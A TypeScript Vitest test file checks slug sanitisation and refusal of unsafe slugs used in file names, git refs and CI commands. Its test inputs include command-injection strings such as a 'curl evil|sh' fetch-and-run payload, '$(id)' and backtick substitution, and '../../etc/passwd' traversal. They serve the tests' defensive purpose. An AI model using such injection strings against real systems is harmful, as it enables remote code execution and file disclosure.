import {describe, it, expect} from 'vitest';
import {
	ensureSafeSlug,
	isSafeSlug,
	MAX_SLUG_LENGTH,
	toSafeSlug,
} from '../src/slug-safety.js';
import {
	resolveAdvanceArg,
	resolveSlug,
	resolveTaskOnlyArg,
	SlugResolutionError,
} from '../src/slug-namespace.js';

/**
 * Slugs name files, git refs and CI command lines, and some are drafted from
 * content an outsider controls (an issue title, an agent verdict). Producers
 * sanitise with `toSafeSlug` / `ensureSafeSlug`; the resolvers refuse anything
 * outside `isSafeSlug`, which also covers hand-written frontmatter `slug:`s.
 */

describe('toSafeSlug', () => {
	it.each([
		['support-$(id)-in-config', 'support-id-in-config'],
		['x"; curl evil|sh; echo "', 'x-curl-evil-sh-echo'],
		['a`id`b', 'a-id-b'],
		['../../etc/passwd', 'etc-passwd'],
		['feat/../x', 'feat-x'],
		['-rf', 'rf'],
		['Café déjà vu', 'Cafe-deja-vu'],
		['line\nbreak', 'line-break'],
		['already-safe-slug', 'already-safe-slug'],
		['$();|', ''],
	])('%j -> %j', (input, expected) => {
		expect(toSafeSlug(input)).toBe(expected);
		if (expected !== '') expect(isSafeSlug(expected)).toBe(true);
	});

	it('caps the length without leaving a trailing hyphen', () => {
		const out = toSafeSlug('word-'.repeat(60));
		expect(out.length).toBeLessThanOrEqual(MAX_SLUG_LENGTH);
		expect(out.endsWith('-')).toBe(false);
		expect(isSafeSlug(out)).toBe(true);
	});
});

describe('isSafeSlug', () => {
	it('accepts the slugs real work/ trees use (mixed case, dots, underscores)', () => {
		for (const s of [
			'add-quiet-flag',
			'promotion-buildPromotedBody-uses-shared-renderer',
			'setup-nudge-changeset-mentions-dorflBin-2026-07-21',
			'bump-to-v0.2',
			'snake_case_slug',
			'a',
		]) {
			expect(isSafeSlug(s)).toBe(true);
		}
	});

	it('refuses shell metacharacters, separators, traversal, option-like and over-long slugs', () => {
		for (const s of [
			'',
			'support-$(id)',
			'a"b',
			'a`b',
			'a;b',
			'a|b',
			'a b',
			'a/b',
			'a..b',
			'-rf',
			'.hidden',
			'trailing-',
			'prd:thing',
			'branch.lock',
			'line\nbreak',
			'x'.repeat(MAX_SLUG_LENGTH + 1),
		]) {
			expect(isSafeSlug(s)).toBe(false);
		}
	});
});

describe('ensureSafeSlug', () => {
	it('keeps an already-safe slug exactly (only unsafe input changes)', () => {
		expect(ensureSafeSlug('promotion-buildPromotedBody-x')).toBe(
			'promotion-buildPromotedBody-x',
		);
		expect(ensureSafeSlug('  bump-to-v0.2  ')).toBe('bump-to-v0.2');
		expect(ensureSafeSlug('../x')).toBe('x');
	});
});

describe('the slug resolvers refuse unsafe slugs', () => {
	const read = {
		resolveSpecExistence: () => ({exists: false}),
	} as unknown as Parameters<typeof resolveSlug>[0]['read'];

	it.each([
		'task:support-$(id)-x',
		'spec:a/b',
		'obs:../x',
		'x"; curl evil|sh; echo "',
	])('%j', (arg) => {
		expect(() =>
			resolveAdvanceArg({arg, repoPath: '/nonexistent', read}),
		).toThrow(SlugResolutionError);
		if (!arg.startsWith('obs:')) {
			expect(() => resolveSlug({arg, repoPath: '/nonexistent', read})).toThrow(
				SlugResolutionError,
			);
		}
		if (arg.startsWith('task:') || !arg.includes(':')) {
			expect(() => resolveTaskOnlyArg(arg)).toThrow(SlugResolutionError);
		}
	});

	it('still resolves a safe explicit slug', () => {
		expect(
			resolveAdvanceArg({arg: 'task:add-quiet-flag', repoPath: '/x', read}),
		).toEqual({namespace: 'task', slug: 'add-quiet-flag', explicit: true});
		expect(resolveTaskOnlyArg('task:bump-to-v0.2')).toBe('bump-to-v0.2');
	});
});
